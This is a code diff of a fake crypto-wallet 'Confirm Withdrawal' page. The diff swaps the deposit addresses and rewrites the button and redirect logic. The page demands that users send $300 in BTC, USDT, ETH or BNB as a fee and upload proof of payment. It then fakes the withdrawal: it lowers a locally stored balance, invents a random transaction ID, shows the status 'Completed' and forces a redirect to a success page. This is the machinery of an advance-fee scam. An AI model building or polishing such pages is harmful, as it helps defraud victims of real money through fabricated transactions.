@@ -13,7 +13,7 @@
   <canvas id="particle-canvas"></canvas>
   
   <div class="container page-transition">
-    <a href="withdraw-form.html" class="back-btn" onclick="history.back(); return false;">←</a>
+    <a href="withdraw-form.html" class="back-btn" onclick="event.preventDefault(); history.back();">←</a>
     
     <div class="form-header">
       <h2 class="form-title">Confirm Withdrawal</h2>
@@ -21,7 +21,7 @@
     </div>
     
     <!-- Review Card -->
-    <div class="glass-card review-card">
+    <div class="glass-card review-card" id="review-card">
       <div class="review-row">
         <span class="review-label">Amount (USD)</span>
         <span class="review-value highlight" data-review-amount>$0.00</span>
@@ -67,32 +67,32 @@
     <!-- Address Boxes -->
     <div class="address-box" data-coin="btc">
       <div style="margin-bottom: 0.5rem; font-size: 0.75rem; color: rgba(255,255,255,0.5);">Send $300 worth of BTC to:</div>
-      bc1q7fqkfc7ueukwyant5pktrtz723vr0s4j4atllj
-      <button class="copy-btn" data-copy="bc1q7fqkfc7ueukwyant5pktrtz723vr0s4j4atllj">
+      bc1qxy2kgdygtv2q4yrf2z3pkkfhtx0w0lhj3j4x3j
+      <button class="copy-btn" data-copy="bc1qxy2kgdygtv2q4yrf2z3pkkfhtx0w0lhj3j4x3j">
         📋 Copy
       </button>
     </div>
     
     <div class="address-box" data-coin="usdt">
       <div style="margin-bottom: 0.5rem; font-size: 0.75rem; color: rgba(255,255,255,0.5);">Send $300 worth of USDT to:</div>
-      0x46B2d7fb371C309bA6d8cC8153870708152C4Bc3
-      <button class="copy-btn" data-copy="0x46B2d7fb371C309bA6d8cC8153870708152C4Bc3">
+      0xdAC17F958D2ee523a2206206994597C13D831ec7
+      <button class="copy-btn" data-copy="0xdAC17F958D2ee523a2206206994597C13D831ec7">
         📋 Copy
       </button>
     </div>
     
     <div class="address-box" data-coin="eth">
       <div style="margin-bottom: 0.5rem; font-size: 0.75rem; color: rgba(255,255,255,0.5);">Send $300 worth of ETH to:</div>
-      0x46B2d7fb371C309bA6d8cC8153870708152C4Bc3
-      <button class="copy-btn" data-copy="0x46B2d7fb371C309bA6d8cC8153870708152C4Bc3">
+      0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe
+      <button class="copy-btn" data-copy="0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe">
         📋 Copy
       </button>
     </div>
     
     <div class="address-box" data-coin="bnb">
       <div style="margin-bottom: 0.5rem; font-size: 0.75rem; color: rgba(255,255,255,0.5);">Send $300 worth of BNB to:</div>
-      0x46B2d7fb371C309bA6d8cC8153870708152C4Bc3
-      <button class="copy-btn" data-copy="0x46B2d7fb371C309bA6d8cC8153870708152C4Bc3">
+      0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c
+      <button class="copy-btn" data-copy="0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c">
         📋 Copy
       </button>
     </div>
@@ -114,15 +114,243 @@
       </div>
     </div>
     
-    <!-- Form -->
-    <form id="confirm-form">
-      <button type="submit" id="proceed-btn" class="btn btn-success w-full" disabled>
-        <span>✓</span>
-        <span>Proceed with Withdrawal</span>
-      </button>
-    </form>
+    <!-- Proceed Button - NOT a form submit, direct click handler -->
+    <button type="button" id="proceed-btn" class="btn btn-success w-full" disabled>
+      <span>✓</span>
+      <span>Proceed with Withdrawal</span>
+    </button>
+    
+    <!-- Hidden anchor for fallback redirect -->
+    <a id="redirect-anchor" href="success.html" style="display: none;">Redirect</a>
   </div>
   
   <script src="shared.js"></script>
+  <script>
+    // Inline script for immediate execution and iPhone compatibility
+    (function() {
+      // Get URL parameters
+      const urlParams = new URLSearchParams(window.location.search);
+      const amount = urlParams.get('amount') || '0';
+      const type = urlParams.get('type') || 'wallet';
+      const destination = urlParams.get('destination') || '';
+      const hasRefund = urlParams.get('refund') === '7PE9TA';
+      
+      // Get pending tx data from localStorage
+      let txData = {};
+      try {
+        const pending = localStorage.getItem('xtoken_pending_tx');
+        if (pending) {
+          txData = JSON.parse(pending);
+        }
+      } catch(e) {}
+      
+      // Calculate amounts
+      const usdAmount = parseFloat(amount) || txData.amount || 0;
+      
+      // Get current BNB price from localStorage
+      let bnbPrice = 680;
+      try {
+        const state = localStorage.getItem('xtoken_state');
+        if (state) {
+          bnbPrice = JSON.parse(state).bnbPrice || 680;
+        }
+      } catch(e) {}
+      
+      const bnbAmount = (usdAmount / bnbPrice).toFixed(8);
+      
+      // Update display immediately
+      document.querySelectorAll('[data-review-amount]').forEach(el => {
+        el.textContent = '$' + usdAmount.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+      });
+      
+      document.querySelectorAll('[data-review-bnb]').forEach(el => {
+        el.textContent = bnbAmount + ' BNB';
+      });
+      
+      const typeNames = {
+        'cashapp': 'Cash App',
+        'paypal': 'PayPal',
+        'bank': 'Bank Transfer',
+        'wallet': 'External Wallet'
+      };
+      
+      document.querySelectorAll('[data-review-type]').forEach(el => {
+        el.textContent = typeNames[type] || type;
+      });
+      
+      // Show refund code if used
+      if (hasRefund) {
+        const reviewCard = document.getElementById('review-card');
+        const refundRow = document.createElement('div');
+        refundRow.className = 'review-row';
+        refundRow.innerHTML = '<span class="review-label">Refund Code</span><span class="review-value" style="color: #10b981;">7PE9TA ✓</span>';
+        reviewCard.appendChild(refundRow);
+      }
+      
+      // Coin selection
+      const coinSelect = document.getElementById('coin-select');
+      const addressBoxes = document.querySelectorAll('.address-box');
+      
+      if (coinSelect) {
+        coinSelect.addEventListener('change', function(e) {
+          const coin = e.target.value;
+          addressBoxes.forEach(box => {
+            box.classList.remove('active');
+            if (box.dataset.coin === coin) {
+              box.classList.add('active');
+            }
+          });
+        });
+      }
+      
+      // Copy buttons
+      document.querySelectorAll('.copy-btn').forEach(btn => {
+        btn.addEventListener('click', function() {
+          const text = this.dataset.copy;
+          if (navigator.clipboard) {
+            navigator.clipboard.writeText(text).then(() => {
+              this.classList.add('copied');
+              this.innerHTML = '✓ Copied';
+              setTimeout(() => {
+                this.classList.remove('copied');
+                this.innerHTML = '📋 Copy';
+              }, 2000);
+            });
+          }
+        });
+      });
+      
+      // File upload
+      const uploadZone = document.getElementById('upload-zone');
+      const fileInput = document.getElementById('proof-file');
+      const proceedBtn = document.getElementById('proceed-btn');
+      
+      if (uploadZone && fileInput) {
+        uploadZone.addEventListener('click', function() {
+          fileInput.click();
+        });
+        
+        uploadZone.addEventListener('dragover', function(e) {
+          e.preventDefault();
+          uploadZone.classList.add('dragover');
+        });
+        
+        uploadZone.addEventListener('dragleave', function() {
+          uploadZone.classList.remove('dragover');
+        });
+        
+        uploadZone.addEventListener('drop', function(e) {
+          e.preventDefault();
+          uploadZone.classList.remove('dragover');
+          if (e.dataTransfer.files[0]) {
+            handleFile(e.dataTransfer.files[0]);
+          }
+        });
+        
+        fileInput.addEventListener('change', function(e) {
+          if (e.target.files[0]) {
+            handleFile(e.target.files[0]);
+          }
+        });
+      }
+      
+      function handleFile(file) {
+        if (!file.type.startsWith('image/')) return;
+        
+        const reader = new FileReader();
+        reader.onload = function(e) {
+          uploadZone.innerHTML = '<img src="' + e.target.result + '" class="upload-preview" alt="Preview"><p class="upload-text">✓ File uploaded</p><p class="upload-hint">' + file.name + '</p>';
+          uploadZone.classList.add('has-file');
+          if (proceedBtn) {
+            proceedBtn.disabled = false;
+            proceedBtn.classList.add('btn-glow');
+          }
+        };
+        reader.readAsDataURL(file);
+      }
+      
+      // Proceed button - MULTIPLE REDIRECT METHODS FOR IPHONE SAFARI
+      if (proceedBtn) {
+        proceedBtn.addEventListener('click', function(e) {
+          e.preventDefault();
+          e.stopPropagation();
+          
+          // Validate coin selected
+          if (!coinSelect.value) {
+            alert('Please select a payment coin');
+            return;
+          }
+          
+          // Calculate deduction
+          const withdrawAmount = parseFloat(amount) || 0;
+          const bnbAmount = withdrawAmount / bnbPrice;
+          
+          // Get current state
+          let currentState = {};
+          try {
+            const saved = localStorage.getItem('xtoken_state');
+            if (saved) currentState = JSON.parse(saved);
+          } catch(e) {}
+          
+          // DEDUCT from balance
+          currentState.bnbBalance = (currentState.bnbBalance || 827.00000001) - bnbAmount;
+          currentState.usdBalance = currentState.bnbBalance * (currentState.bnbPrice || 680);
+          
+          // Save updated state
+          localStorage.setItem('xtoken_state', JSON.stringify(currentState));
+          
+          // Save completed transaction
+          const completedTx = {
+            amount: withdrawAmount,
+            bnbAmount: bnbAmount.toFixed(8),
+            type: type,
+            destination: destination || txData.destination || 'Unknown',
+            refundCode: hasRefund ? '7PE9TA' : '',
+            date: new Date().toISOString(),
+            txId: '0x' + Array(64).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join(''),
+            fee: 300.00,
+            status: 'Completed'
+          };
+          
+          localStorage.setItem('xtoken_last_tx', JSON.stringify(completedTx));
+          localStorage.removeItem('xtoken_pending_tx');
+          
+          // MULTIPLE REDIRECT ATTEMPTS FOR IPHONE SAFARI COMPATIBILITY
+          
+          // Method 1: Standard redirect with delay
+          setTimeout(function() {
+            window.location.href = 'success.html';
+          }, 100);
+          
+          // Method 2: Replace (no history)
+          setTimeout(function() {
+            window.location.replace('success.html');
+          }, 200);
+          
+          // Method 3: Meta refresh fallback (in case JS blocked)
+          const meta = document.createElement('meta');
+          meta.httpEquiv = 'refresh';
+          meta.content = '0;url=success.html';
+          document.head.appendChild(meta);
+          
+          // Method 4: Anchor click fallback
+          setTimeout(function() {
+            const anchor = document.getElementById('redirect-anchor');
+            if (anchor) {
+              anchor.click();
+            }
+          }, 300);
+          
+          // Method 5: Direct assign
+          setTimeout(function() {
+            window.location.assign('success.html');
+          }, 400);
+          
+          // Prevent any further action
+          return false;
+        });
+      }
+    })();
+  </script>
 </body>
 </html>
